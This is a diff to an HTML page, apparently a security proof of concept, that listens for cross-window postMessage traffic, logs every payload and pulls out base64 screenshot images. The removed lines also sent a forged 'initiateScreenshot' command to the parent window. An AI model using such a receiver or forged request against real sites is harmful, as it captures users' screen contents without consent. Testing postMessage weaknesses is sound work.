@@ -3,31 +3,22 @@
   <body>
     <h1>Receiver Loaded</h1>
     <script>
-      let log = [];
-
       window.addEventListener("message", (e) => {
-        console.log("🔴 FULL MESSAGE RECEIVED:", e.data);
-        log.push(e.data);
+        const data = e.data;
+        console.log("🔴 [postMessage] FULL PAYLOAD:", data);
 
-        // Try to detect potential screenshot blobs
-        const str = JSON.stringify(e.data);
-        if (str.length > 500 && str.includes("data:image/png;base64")) {
-          alert("⚠️ Screenshot Data Detected!");
-          const img = new Image();
-          img.src = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/)[0];
-          document.body.appendChild(img);
-        } else {
-          alert("📥 Message:\n" + str.slice(0, 600) + (str.length > 600 ? "..." : ""));
+        const payload = JSON.stringify(data);
+        if (payload.length > 100000 && payload.includes("data:image/png;base64")) {
+          const match = payload.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+          if (match) {
+            const img = new Image();
+            img.src = match[0];
+            img.style.maxWidth = "300px";
+            document.body.appendChild(img);
+            console.log("✅ Screenshot image injected into DOM.");
+          }
         }
       }, false);
-
-      // Also attempt to spoof screenshot requests back
-      setTimeout(() => {
-        window.parent.postMessage({
-          type: "feedback",
-          command: "initiateScreenshot"
-        }, "*");
-      }, 3000);
     </script>
   </body>
 </html>
